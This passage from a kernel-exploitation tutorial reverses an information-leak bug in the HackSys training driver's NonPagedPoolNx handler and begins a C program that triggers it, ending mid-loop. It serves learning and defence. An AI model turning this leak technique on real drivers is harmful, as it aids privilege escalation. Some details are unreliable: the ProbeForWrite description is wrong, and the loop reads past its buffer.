<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">      </span><span class="n">NumberOfBytes</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">       </span><span class="n">Tag</span><span class="w"></span>
<a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="p">);</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Drawing a comparison between user-land and kernel-land for a second, in user-land developers have the default process heap to allocate chunks from. Alternatively they can create their own private heaps. The Windows Pool is different as the system predefines the pools for servicing requests in the kernel, i.e, through pool types which have distinct properties.</p>
<p>We won't be talking about the Paged or Session Pool here as these are out of scope for this post. Instead we will focus on the NonPagedNx Pool. We could talk in much more detail about the pool however this is ultimately out of the scope of this post.</p>
<h2 id="nonpagednx-pool">NonPagedNx Pool<a class="headerlink" href="#nonpagednx-pool" title="Permanent link">&para;</a></h2>
<p>Since Windows 8 a new pool type called the NonPagedNx pool was released, although it operates on the same paging principle as the original NonPaged Pool it has some additional security properties the most obvious one being "Non-eXecutable" (NX). In a later post we will exploit a pool overflow in the NonPagedNx pool but for now we're going to swim in the shallow end and build a basic understanding that we can leverage in future posts for more cool hax.</p>
<hr>

<h1 id="reversing-the-driver">Reversing the Driver<a class="headerlink" href="#reversing-the-driver" title="Permanent link">&para;</a></h1>
<p>As in previous posts the <code>IrpDeviceIoCtlHandler</code> is located at <code>sub_140085078</code>. To find the vulnerable functions <abbr title="Input Output Control">IOCTL</abbr> handler we can just do a string search for the words "Memory Disclosure" which should take us to the address <code>loc_140085487</code> which has the <abbr title="Input Output Control">IOCTL</abbr> handler for the vulnerable NonPagedPoolNx Memory Disclosure function.</p>
<h2 id="locating-the-ioctl-handler">Locating the <abbr title="Input Output Control">IOCTL</abbr> Handler<a class="headerlink" href="#locating-the-ioctl-handler" title="Permanent link">&para;</a></h2>
<p>At <code>IrpDeviceIoCtlHandler+42E</code> is a call to the <abbr title="Input Output Control">IOCTL</abbr> handler which we'll rename to <code>MemoryDisclosureNonPagedPoolNxIoctlHandler</code>.</p>
<h2 id="reversing-the-vulnerable-function">Reversing the Vulnerable Function<a class="headerlink" href="#reversing-the-vulnerable-function" title="Permanent link">&para;</a></h2>
<p>Inside <code>MemoryDisclosureNonPagedPoolNxIoctlHandler</code> at <code>MemoryDisclosureNonPagedPoolNxIoctlHandler+15</code> there is a call to the trigger of the vulnerable function, we'll rename this to <code>TriggerMemoryDisclosureNonPagedPoolNx</code>. Let's open the function in IDA.</p>
<details class="hint" open="open">
<summary>Hint</summary>
<p>The below decompilation has been cleaned up and modified so your IDA output won't be identical!</p>
</details>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Vulnerable Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-3-10">10</a></span>
<span class="normal"><a href="#__codelineno-3-11">11</a></span>
<span class="normal"><a href="#__codelineno-3-12">12</a></span>
<span class="normal"><a href="#__codelineno-3-13">13</a></span>
<span class="normal"><a href="#__codelineno-3-14">14</a></span>
<span class="normal"><a href="#__codelineno-3-15">15</a></span>
<span class="normal"><a href="#__codelineno-3-16">16</a></span>
<span class="normal"><a href="#__codelineno-3-17">17</a></span>
<span class="normal"><a href="#__codelineno-3-18">18</a></span>
<span class="normal"><a href="#__codelineno-3-19">19</a></span>
<span class="normal"><a href="#__codelineno-3-20">20</a></span>
<span class="normal"><a href="#__codelineno-3-21">21</a></span>
<span class="normal"><a href="#__codelineno-3-22">22</a></span>
<span class="normal"><a href="#__codelineno-3-23">23</a></span>
<span class="normal"><a href="#__codelineno-3-24">24</a></span>
<span class="normal"><a href="#__codelineno-3-25">25</a></span>
<span class="normal"><a href="#__codelineno-3-26">26</a></span>
<span class="normal"><a href="#__codelineno-3-27">27</a></span>
<span class="normal"><a href="#__codelineno-3-28">28</a></span>
<span class="normal"><a href="#__codelineno-3-29">29</a></span>
<span class="normal"><a href="#__codelineno-3-30">30</a></span>
<span class="normal"><a href="#__codelineno-3-31">31</a></span>
<span class="normal"><a href="#__codelineno-3-32">32</a></span>
<span class="normal"><a href="#__codelineno-3-33">33</a></span>
<span class="normal"><a href="#__codelineno-3-34">34</a></span>
<span class="normal"><a href="#__codelineno-3-35">35</a></span>
<span class="normal"><a href="#__codelineno-3-36">36</a></span>
<span class="normal"><a href="#__codelineno-3-37">37</a></span>
<span class="normal"><a href="#__codelineno-3-38">38</a></span>
<span class="normal"><a href="#__codelineno-3-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="n">TriggerMemoryDisclosureNonPagedPoolNx</span><span class="p">(</span><span class="k">volatile</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">UserSize</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w">  </span><span class="n">PVOID</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="w">  </span><span class="n">int64</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-5" name="__codelineno-3-5"></a>
<a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Allocating Pool chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="w">  </span><span class="n">KernelBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ExAllocatePoolWithTag</span><span class="p">((</span><span class="n">POOL_TYPE</span><span class="p">)</span><span class="mi">512</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6B636148</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-8" name="__codelineno-3-8"></a>
<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="w">  </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&#39;kcaH&#39;&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;NonPagedPoolNx&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">504</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-15" name="__codelineno-3-15"></a>
<a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="mi">65</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F8</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-17" name="__codelineno-3-17"></a><span class="w">    </span><span class="n">ProbeForWrite</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F8</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-18" name="__codelineno-3-18"></a>
<a id="__codelineno-3-19" name="__codelineno-3-19"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserOutputBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-20" name="__codelineno-3-20"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserOutputBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UserSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-21" name="__codelineno-3-21"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-22" name="__codelineno-3-22"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">504</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-23" name="__codelineno-3-23"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Triggering Memory Disclosure in NonPagedPoolNx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-24" name="__codelineno-3-24"></a>
<a id="__codelineno-3-25" name="__codelineno-3-25"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-26" name="__codelineno-3-26"></a>
<a id="__codelineno-3-27" name="__codelineno-3-27"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Freeing Pool chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-28" name="__codelineno-3-28"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&#39;kcaH&#39;&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-29" name="__codelineno-3-29"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-30" name="__codelineno-3-30"></a><span class="w">    </span><span class="n">ExFreePoolWithTag</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6B636148</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-31" name="__codelineno-3-31"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-32" name="__codelineno-3-32"></a><span class="w">  </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-3-33" name="__codelineno-3-33"></a><span class="w">  </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-3-34" name="__codelineno-3-34"></a><span class="w">  </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-35" name="__codelineno-3-35"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-36" name="__codelineno-3-36"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3221225495</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-37" name="__codelineno-3-37"></a><span class="w">  </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-3-38" name="__codelineno-3-38"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-39" name="__codelineno-3-39"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Starting from the top of the function we can see that there's a pool allocation through the <code>ExAllocatePoolWithTag</code> function which passes three parameters:</p>
<ol>
<li>A <code>POOL_TYPE</code> of 512 (which is NonPagedPoolNx)</li>
<li>A size of the allocation which is <code>0x1F8</code> </li>
<li>A Pool tag which is represented in hex <code>0x6B636148</code></li>
</ol>
<p>Based on the print statements following the allocation we know that the final argument in the call to <code>ExAllocatePoolWithTag</code> is <code>kcaH</code> which is <code>Hack</code> reversed.</p>
<p>Moving down the function we can see there's a call to <code>memset()</code> which sets the allocated Pool buffer to be filled with <code>65</code> which is <code>0x41</code> in hex (<code>A</code> characters). And that memset uses the same size that was used for the total allocation, i.e, it sets the entire allocated buffer to be filled with <code>A</code>.</p>
<p>Directly after the call to <code>memset()</code> there is a call to <code>ProbeForWrite()</code> which we know from previous posts does a write from a user-mode buffer stored at <code>Address</code>. We can see that the write uses the same size that was used for the pool buffer, so far no vulnerabilities here.</p>
<p>If we move down past the prints we can see there's a call to <code>RtlCopyMemory</code> (<code>memcpy</code>) which copies the contents of the allocated pool buffer into the user-mode address. The final argument is the size argument and here is where the problem is. If we look at the top of the function we can see that <code>TriggerMemoryDisclosureNonPagedPoolNx</code> takes two arguments, a pointer to a user-mode buffer and a <code>SIZE_T</code> arugment (which is also controlled by us.) Then when we get to the <code>RtlCopyMemory</code> instead of using the same size that was used to allocate the pool buffer, it uses the size specified by the user in the call to <code>TriggerMemoryDisclosureNonPagedPoolNx</code>. <strong>This is a classic information leak vulnerability.</strong></p>
<p>Since we control the size parameter for the copy, we can leak data from adjacent pool chunks which can include kernel addresess and more.</p>
<hr>

<h1 id="dynamic-analysis">Dynamic Analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">&para;</a></h1>
<p>Now that we've done some static analysis let's set a breakpoint on <code>TriggerMemoryDisclosureNonPagedPoolNx</code> in WinDbg and step through the function to confirm the behaviour that we've seen so far. </p>
<h2 id="interacting-with-the-driver">Interacting with the Driver<a class="headerlink" href="#interacting-with-the-driver" title="Permanent link">&para;</a></h2>
<p>To aid the dynamic analysis process we'll create a simple program to interact with the driver. Most of this code will be familiar to you from previous posts so I won't explain all of it here again.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Simple Interaction Program</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span>
<span class="normal"><a href="#__codelineno-4-26">26</a></span>
<span class="normal"><a href="#__codelineno-4-27">27</a></span>
<span class="normal"><a href="#__codelineno-4-28">28</a></span>
<span class="normal"><a href="#__codelineno-4-29">29</a></span>
<span class="normal"><a href="#__codelineno-4-30">30</a></span>
<span class="normal"><a href="#__codelineno-4-31">31</a></span>
<span class="normal"><a href="#__codelineno-4-32">32</a></span>
<span class="normal"><a href="#__codelineno-4-33">33</a></span>
<span class="normal"><a href="#__codelineno-4-34">34</a></span>
<span class="normal"><a href="#__codelineno-4-35">35</a></span>
<span class="normal"><a href="#__codelineno-4-36">36</a></span>
<span class="normal"><a href="#__codelineno-4-37">37</a></span>
<span class="normal"><a href="#__codelineno-4-38">38</a></span>
<span class="normal"><a href="#__codelineno-4-39">39</a></span>
<span class="normal"><a href="#__codelineno-4-40">40</a></span>
<span class="normal"><a href="#__codelineno-4-41">41</a></span>
<span class="normal"><a href="#__codelineno-4-42">42</a></span>
<span class="normal"><a href="#__codelineno-4-43">43</a></span>
<span class="normal"><a href="#__codelineno-4-44">44</a></span>
<span class="normal"><a href="#__codelineno-4-45">45</a></span>
<span class="normal"><a href="#__codelineno-4-46">46</a></span>
<span class="normal"><a href="#__codelineno-4-47">47</a></span>
<span class="normal"><a href="#__codelineno-4-48">48</a></span>
<span class="normal"><a href="#__codelineno-4-49">49</a></span>
<span class="normal"><a href="#__codelineno-4-50">50</a></span>
<span class="normal"><a href="#__codelineno-4-51">51</a></span>
<span class="normal"><a href="#__codelineno-4-52">52</a></span>
<span class="normal"><a href="#__codelineno-4-53">53</a></span>
<span class="normal"><a href="#__codelineno-4-54">54</a></span>
<span class="normal"><a href="#__codelineno-4-55">55</a></span>
<span class="normal"><a href="#__codelineno-4-56">56</a></span>
<span class="normal"><a href="#__codelineno-4-57">57</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-4-4" name="__codelineno-4-4"></a>
<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="cp">#define IOCTL_CODE 0x0022204f</span>
<a id="__codelineno-4-7" name="__codelineno-4-7"></a>
<a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="cm">/* Function to open a handle to the driver */</span><span class="w"></span>
<a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-12" name="__codelineno-4-12"></a>
<a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="w">    </span><span class="cm">/* Opens handle to driver */</span><span class="w"></span>
<a id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="c1">// If handle cant open, exit.</span>
<a id="__codelineno-4-16" name="__codelineno-4-16"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-17" name="__codelineno-4-17"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[!] FATAL: Failed to open driver handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-20" name="__codelineno-4-20"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-22" name="__codelineno-4-22"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Opened Driver Handle: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"> </span><span class="c1">// Return handle to driver to be used later.</span>
<a id="__codelineno-4-24" name="__codelineno-4-24"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-26" name="__codelineno-4-26"></a>
<a id="__codelineno-4-27" name="__codelineno-4-27"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-4-28" name="__codelineno-4-28"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-29" name="__codelineno-4-29"></a>
<a id="__codelineno-4-30" name="__codelineno-4-30"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-31" name="__codelineno-4-31"></a><span class="w">    </span><span class="n">BYTE</span><span class="w">    </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="mh">0x1F8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-4-32" name="__codelineno-4-32"></a>
<a id="__codelineno-4-33" name="__codelineno-4-33"></a><span class="w">    </span><span class="cm">/* Issue IOCTL */</span><span class="w"></span>
<a id="__codelineno-4-34" name="__codelineno-4-34"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-35" name="__codelineno-4-35"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F8</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="c1">// (1)</span>
<a id="__codelineno-4-36" name="__codelineno-4-36"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-37" name="__codelineno-4-37"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-38" name="__codelineno-4-38"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-40" name="__codelineno-4-40"></a>
<a id="__codelineno-4-41" name="__codelineno-4-41"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Kernel Allocation Contents: &quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-42" name="__codelineno-4-42"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x1F8</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-4-43" name="__codelineno-4-43"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-44" name="__codelineno-4-44"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%x&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
